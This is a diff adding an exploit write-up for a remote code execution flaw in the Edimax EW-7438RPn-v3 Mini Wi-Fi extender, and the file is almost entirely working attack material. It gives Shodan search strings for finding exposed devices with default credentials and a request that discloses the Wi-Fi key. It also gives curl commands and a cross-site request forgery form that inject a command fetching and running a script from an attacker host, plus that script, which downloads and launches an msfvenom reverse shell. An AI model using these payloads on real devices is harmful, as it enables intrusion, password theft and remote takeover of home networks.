@@ -1,0 +1,42 @@
+# Exploit Title: Edimax Technology EW-7438RPn-v3 Mini 1.27 - Remote Code Execution
+# Date: 2020-04-13
+# Exploit Author: Wadeek
+# Hardware Version: EW-7438RPn-v3 Mini
+# Firmware Version: 1.23 / 1.27
+# Vendor Homepage: https://www.edimax.com/edimax/merchandise/merchandise_detail/data/edimax/global/wi-fi_range_extenders_n300/ew-7438rpn_mini/
+# Firmware Link: https://www.edimax.com/edimax/mw/cufiles/files/download/Firmware/EW-7438RPn_mini_1.27.zip
+
+== Shodan Dorks ==
+
+(Setup Mode) "HTTP/1.0 302 Redirect" "Server: Boa/0.94.14rc21" "http://(null)/index.asp"
+(Unsetup Mode) "HTTP/1.1 401 Unauthorized" "Server: Boa/0.94.14rc21" "Default Name:admin Password:1234"
+
+== Unauthorized Access - Wi-Fi Password Disclosure (Unsetup Mode) ==
+
+GET /wizard_reboot.asp
+showSSID = "<WIRELESS-NAME>";
+document.write('<font class=\"textcolor\">'+"<WIRELESS-SECURITY-KEY>"+'</font>');
+
+== Command Execution * ==
+
+(Setup Mode)
+curl 'http://<RHOST>/goform/mp' --data 'command=%7C%7C+busybox+wget+-O+-+http%3A%2F%2F<LHOST>%2Fdelivery.sh+%7C+%2Fbin%2Fsh'
+
+(Unsetup Mode with default password)
+curl 'http://<RHOST>/goform/mp' -H 'Authorization: Basic YWRtaW46MTIzNA==' --data 'command=%7C%7C+busybox+wget+-O+-+http%3A%2F%2F<LHOST>%2Fdelivery.sh+%7C+%2Fbin%2Fsh'
+
+== Cross-Site Request Forgery -> Command Execution * ==
+
+<form action="http://edimaxext.setup/goform/mp" method="POST">
+	<input type="hidden" name="command" value="|| busybox wget -O - http://<LHOST>/delivery.sh | /bin/sh">
+	<input type="submit" value="">
+</form>
+
+* [ delivery.sh ]
+--------------------------------------------------------------------------------------
+# (msfvenom) linux/mipsbe/shell/reverse_tcp
+cd /tmp/
+busybox wget -O reverse http://<LHOST>/reverse
+busybox chmod +x reverse
+./reverse &
+--------------------------------------------------------------------------------------
